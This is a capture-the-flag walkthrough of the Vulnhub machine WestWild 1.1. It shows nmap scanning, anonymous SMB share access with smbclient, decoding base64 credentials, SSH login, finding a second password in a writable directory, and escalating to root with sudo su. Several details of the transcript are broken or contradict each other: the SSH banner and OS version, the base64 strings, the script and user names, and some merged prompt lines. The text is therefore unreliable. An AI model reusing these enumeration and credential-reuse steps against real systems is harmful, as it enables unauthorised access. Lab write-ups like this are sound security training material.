# WestWild: 1.1: Vulnhub Walkthorugh

Today we are going to take a new CTF challenge WestWild. The credit for making this VM machine goes to “Hashim Alsharef” and it is a boot2root challenge where we have to root the server and capture the flag to complete the challenge.

**Penetrating Methodology:**

**Scanning**

- Nmap

**Enumeration**

- Enum4Linux
- Smbclient

**Exploitation**

- SSH

**Privilege Escalation**

- Exploiting Sudo rights

### Walkthrough:

### Scanning:

**Let’s start off with the scanning process. The target VM took the IP address of 192.168.1.104 automatically from our local wifi network.**

Then we used Nmap for port enumeration and found port 22, 80,139 and 445 are open.

nmap -A 192.168.1.104


root@kali:~# nmap -A 192.168.1.104
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-16 15:27 GMT
Nmap scan report for 192.168.1.104
Host is up (0.00059s latency).
Not shown: 996 closed ports
PORT    STATE   SERVICE   VERSION
22/tcp  open    ssh       0enSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu 22.04.1 LTS (GNU/Linux 5.4.0-101-generic x86_64))
| ssh-hostkey:
|    1024 6f:ee:95:91:9c:62:b2:14:cd:63:0a:3e:f8:10:9e:da (DSA)
|    2048 10:45:94:fe:a7:2f:02:8a:9b:21:1a:31:c5:03:30:48 (RSA)
|    256 97:94:17:86:18:e2:8e:7a:73:8e:41:20:76:ba:51:73 (ECDSA)
|_   256 23:81:c7:76:bb:37:78:ee:3b:73:e2:55:ad:81:32:72 (ED25519)
80/tcp  open    http      Apache httpd 2.4.7 (Ubuntu)
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP 445/tcp open   netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP 445)
MAC Address: 00:0C:29:D1:B5:42 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux kernel:3 cpe:/o:linux:linux kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: WESTWILD; OS: Linux; CPE: cpe:/o:linux:linux_kernel:4
Host script results:
|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: 0s
|_nbstat: NetBIOS name: WESTWILD, NetBIOS user: <unknown>, NetBIOS
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: westwild
|   NetBIOS computer name: WESTWILD\x00
|   Domain name: \x00
|   FQDN: westwild
|_  System time: 2019-08-16T18:27:25+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_ signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_  Message signing enabled but not required
| smb2-time:
|   date: 2019-08-16 15:27:25
|_  start_date: N/A


###
**Enumeration:**

We saw port 445 (smb) is open which means there may be a shared directory, so to further enumerate this as well as other ports, we tool help of
**Enum4Linux**
tool. From the results, we got some user details and a shared directory named
**wave.**

enum4linux 192.168.1.104


user: [aveng]  rid: [0x3e8]
user: [wavex]  rid: [0x3ea]
user: [root]  rid: [0x3e9]

---
Share Enumeration on 192.168.1.104
---

ShareName       Type    Comment
print$          Disk    Printer Drivers
wave            Disk    WaveDoor
IPC$            IPC     IPC Service (WestWild serv
Reconnecting with SMB1 for workgroup listing.

Server    Comment
---
Workgroup    Master
WORKGROUP


To confirm our finding of the shared directory we used
**smbclient **
with a blank password and we got lucky and were able to list the shared directories.

Inside the
**wave **
directory, we got two text files
**FLAG1.txt ** & **message_from_aveng.txt **
which we download to our kali system using get command.

smbclient –L \\192.168.1.104
smbclient \\192.168.1.104/wave
ls
get FLAG1.txt
get message_from_aveng.txt

**

root@kali:~# smbclient -L \\192.168.1.104
Enter WORKGROUP\root's password:
Anonymous login successful

ShareName       Type    Comment
print$          Disk    Printer Drivers
wave            Disk    WaveDoor
IPC$            IPC     IPC Service (WestWild serv

Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

Server    Comment
---    ---
Workgroup    Master
WORKGROUP

root@kali:~# smbclient //192.168.1.104/wave
Enter WORKGROUP\root's password:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                         D      0  Tue  Jul  30 05:18:56 2019
  ..                        D      0  Thu  Aug   1 23:02:20 2019
  FLAG1.txt                 D      0  Tue  Jul  30 02:31:05 2019
  message_from_aveng.txt    N    115  Tue  Jul  30 05:21:48 2019

1781464 blocks of size 1024. 285636 blocks available

smb: \> get FLAG1.txt
getting file \FLAG1.txt of size 93 as FLAG1.txt (45.4 KiloBytes/sec) (average)
smb: \> get message_from_aveng.txt
getting file \message_from_aveng.txt of size 115 as message_from_aveng.txt (50)
smb: \> exit

**

We looked into the contents of these text files and found a base64 code inside the
**FLAG1.txt** file. After decoding it we got a username **wavex ** and a password **door+open**.

cat FLAG1.txt
cat message_from_aveng.txt

**

root@kali:~# cat FLAG1.txt
RmxhZzF7V2VsY29tZV9UMF9USEtVzNTVc1XMUXELUIwcmRlcn0KdXNlCjp3YXZleApwYXNz29yZDpk
b29yK29wZW4K
root@kali:~# cat message_from_aveng.txt
Dear Wave,
Am Sorry but i was lost my password ,
and i believe that you can reset it for me .
Thank You
Aveng
root@kali:~# echo 'RmxhZzF7V2VsY29tZV9UMF9USEtVzNTVc1XMUXELUIwcmRlcm0KdXNlCjp3Y
XZleApwYXNz29yZDpkb29yK29wZW4K' | base64 -d
Flag1{Welcome_TO_THE-W3ST-W1LD-B0rder}
user:wavex
password:door+open
root@kali:~#

**

###
**Exploitation:**

We have got a username and a password, so we tried to SSH the target system and were successfully able to log in.

Now our job was to get to the root shell and in the process of doing so, we found a writable directory
**westsidesecret. **
And when we had a look inside the directory we got a script file named
**ififorget.sh.**

Looking inside the script file we found one more username and password
**avenge:kaizen+80**
.

ssh wavex@192.168.1.104
find / -writable -type d 2>/dev/null
cd /usr/share/av/westsidesecret
ls
cat ififorget.sh

**

root@kali:~# ssh wavex@192.168.1.104
wavex@192.168.1.104's password:
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

* Documentation: https://help.ubuntu.com/

System information as of Fri Aug 16 18:33:40 +03 2019

System load: 0.0                        Processes: 159
Usage of /: 77.9% of 1.70GB             Users logged in: 0
Memory usage: 11% (0.0 GB available)    IP address for eth0: 192.168.1.104
Swap usage: 0%

Graph this data and manage this system at:
https://landscape.canonical.com/

New release '16.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Fri Aug 16 18:33:40 2019 from 192.168.1.106
wavex@WestWild:~$ id
uid=1001(wavex) gid=1001(wavex) groups=1001(wavex)
wavex@WestWild:~$ find / -writable -type d 2>/dev/null
/sys/fs/cgroup/systemd/user/1001.user/2.session
/usr/share/av/westsidesecret
/home/wavex
/home/wavex/.cache
/home/wavex/wave
/var/lib/php5
/var/spool/samba
/var/crash
/var/tmp
/proc/2439/task/2439/fd
/proc/2439/fd
/proc/2439/map_files
/run/user/1001
/run/shm
/run/lock
/tmp
wavex@WestWild:~$ cat /usr/share/av/westsidesecret
cat: /usr/share/av/westsidesecret: Is a directory
wavex@WestWild:~$ cd /usr/share/av/westsidesecret
wavex@WestWild:/usr/share/av/westsidesecret$ ls
ififoregt.sh
wavex@WestWild:/usr/share/av/westsidesecret$ cat ififoregt.sh
#!/bin/bash
fgllet "if iforegt so this my way"
echo "user:aveng"
echo "password:kaizen+80"

**

###
**Privilege Escalation:**

We switched to the user
**aveng **
using
**su **
command, put in the password. Now to get to the root shell we looked for the
**sudo**
permissions and found that this user can run all commands as root.

So we switched to the
**root shell **
using sudo su command and finally got the root flag.

su aveng
sudo –l
sudo su
cd /root
cat FLAG2.txt


wavex@WestWild:/usr/share/av/westsidesecrts$ su aveng
Password:
aveng@WestWild:/usr/share/av/westsidesecrts$ cd aveng@WestWild:~$ sudo -l
[sudo] password for aveng: 
Matching Defaults entries for aveng on WestWild:
    env_reset, mail_backpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

User aveng may run the following commands on WestWild:
    (ALL : ALL) ALL
aveng@WestWild:~$ sudo su
root@WestWild:/home/aveng# cd /root
root@WestWild:~# ls
FLAG2.txt
root@WestWild:~# cat FLAG2.txt
Flag2{Weeeeeeeeeeeellco0o0om_T0_WestWild}

Great! take a screenshot and Share it with me in twitter @HashimAlshareff
root@WestWild:~#
